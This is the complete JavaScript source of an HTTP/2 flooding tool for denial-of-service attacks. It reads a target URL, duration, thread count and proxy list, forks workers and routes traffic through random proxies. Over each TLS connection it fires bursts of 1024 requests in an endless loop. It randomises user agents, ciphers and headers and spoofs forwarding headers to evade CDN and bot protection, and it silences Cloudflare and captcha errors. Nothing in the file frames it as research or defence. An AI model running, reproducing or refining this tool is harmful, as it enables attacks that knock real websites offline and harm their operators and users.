const url = require('url'),
fs = require('fs'),
http2 = require('http2'),
http = require('http'),
tls = require('tls'),
net = require('net'),
cluster = require('cluster'),
fakeua = require('fake-useragent'),
cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],
accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
],
lang_header = [
    '*/*',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
],
encoding_header = [
    '*/*',
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate'
],
controle_header = [
    '*/*',
    'max-age=604800',
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'max-age=0, private, must-revalidate',
    'no-cache, no-store, private, max-age=0, must-revalidate',
    'no-cache, no-store, private, s-maxage=604800, must-revalidate',
    'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'no-cache, no-store, max-age=0, must-revalidate',
    'no-store, no-cache, must-revalidate',
    'public, max-age=0, s-maxage=3600, must-revalidate, stale-while-revalidate=28800',
    'no-cache, no-store, private, max-age=604800, must-revalidate'
],
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).setMaxListeners(0);

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}

const target = process.argv[2], time = process.argv[3], thread = process.argv[4], proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g);

function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

if(cluster.isMaster) {
const dateObj = new Date();
  
    console.log(`\x1b[36mURL: \x1b[37m${url.parse(target).host}\n\x1b[36mThread: \x1b[37m${thread}\n\x1b[36mTime: \x1b[37m${time}\n\x1b[36mProxylist: \x1b[37m${process.argv[5]} \x1b[36m- \x1b[37m${proxys.length}\n\x1b[36mTimestamp: \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()}`);

    for(var bb=0;bb<thread;bb++) {

        cluster.fork();

    }

    setTimeout(() => {

        process.exit(-1)
    
    }, time * 1000)

}else {


    function flood() {

        var parsed = url.parse(target);

        const uas = fakeua();

        var cipper = cipher()

        var proxy = proxyr().split(':')

        var header = {
            ":path": parsed.path,
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-Proto": "HTTP",
            "X-Forwarded-For": parsed.path,
            "X-Forwarded-Host": parsed.path,
            "X-Real-Ip": parsed.path,
            "Real-Ip": parsed.path,
            ":method": "GET",
            "User-agent": uas,
            "Origin": target,
            "via": "parsed.path",
            "Pragma": "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-nonces, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, client-x-cache-on, client-x-cache-remote-on, client-x-check-cacheable, client-x-get-cache-key, client-x-get-extracted-values, client-x-get-ssl-client-session-id, client-x-get-true-cache-key, client-x-serial-no, client-x-get-request-id, client-x-get-nonces, client-x-get-client-ip, client-x-feo-trace",
            "Accept": accept(),
            "Accept-Encoding": encoding(),
            "Accept-Language": lang(),
            "Cache-Control": controling(),
        }
        
        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 10000,
            maxSockets: 512,
        });
                
        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            timeout: 1e4,
            ciphers: cipper,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host+':443'
        }, function(){ 
            req.setSocketKeepAlive(true);
        });
    
        req.on('connect', function (res, socket, head) { 
        
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: tls.getCiphers().join(":") + cipper, 
                    secureProtocol: 'TLS_method',
                    TLS_MAX_VERSION: '1.3',
                    servername: parsed.host,
                    uri: parsed.host,
                    curve: "GREASE:X25519:x25519",
                    clientTimeout: 5e3,
                    clientmaxTimeout: 1e4,
                    challengesToSolve: 25, 
                    resolveWithFullResponse: true,
                    HonorCipherOrder: true, 
                    Compression: false, 
                    UseStapling: true, 
                    SessionTickets: false, 
                    requestCert: true, 
                    gzip: true, 
                    port: 443, 
                    sigals: "rsa_pss_rsae_sha256", 
                    strictSSL: false,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: socket
                }, function () {
                    for (let i = 0; i< 1024; i++){
                        const req = client.request(header);
                        req.setEncoding('utf8');

                        req.on('data', (chunk) => {
                            // data += chunk;
                        });
                        req.on("response", () => {
                            req.close();
                        })
                        req.end();
                    }
                })
            });
        });

        req.end();

    }

    setInterval(() => { flood() })
  }
